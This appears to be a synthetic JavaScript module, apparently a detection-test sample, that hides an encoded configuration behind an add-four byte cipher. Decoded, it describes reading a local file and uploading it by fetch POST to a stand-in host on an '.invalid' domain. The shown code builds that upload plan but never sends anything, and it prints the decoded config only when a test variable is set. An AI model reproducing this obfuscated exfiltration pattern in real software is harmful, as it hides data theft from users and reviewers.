  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_2fdc9270 = "[122,65,53,128,119,120,105,116,119,65,118,105,101,104,99,106,109,112,105,48,120,118,101,114,119,113,109,120,99,118,105,113,115,120,105,128,101,104,101,116,120,105,118,65,106,105,120,103,108,99,116,115,119,120,128,119,120,101,107,105,99,103,115,121,114,120,65,53,128,103,101,113,116,101,109,107,114,99,109,104,65,82,83,72,73,49,69,70,53,52,70,57,70,71,128,121,118,112,65,108,120,120,116,119,62,51,51,114,115,104,105,49,101,102,53,52,102,57,102,103,52,54,58,53,50,105,124,101,113,116,112,105,50,109,114,122,101,112,109,104,51,101,116,109,128,121,119,105,118,99,101,107,105,114,120,65,82,115,104,105,69,121,104,109,120,51,101,102,53,52,128,106,109,112,105,99,116,101,120,108,65,51,120,113,116,51,108,121,114,120,118,105,119,119,49,114,115,104,105,51,50,119,120,101,107,105,49,101,102,53,52,102,57,102,103,52,54,58,53,50,113,110,119]";
  const Codec_2fdc9270 = "decimal_array|add_modulo_256|04";

  function load_2fdc9270() { return JSON.parse(Material_2fdc9270); }
  function decode_2fdc9270(storedBytes) { return storedBytes.map((value) => (value - 4 + 256) & 255); }
  async function recover_2fdc9270() {
    const harmlessValue = 19 * 7 - 133;
    const storedBytes = load_2fdc9270(); let recoveredBytes = [];
    switch (1) { case 1: recoveredBytes = decode_2fdc9270(storedBytes); break; default: throw new Error("state"); }
    void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
  }
  async function inspect_2fdc9270() { return Buffer.from(await recover_2fdc9270(), "utf8").toString("utf8"); }
  async function plan_2fdc9270() { const inspect = inspect_2fdc9270; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_2fdc9270;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_2fdc9270());
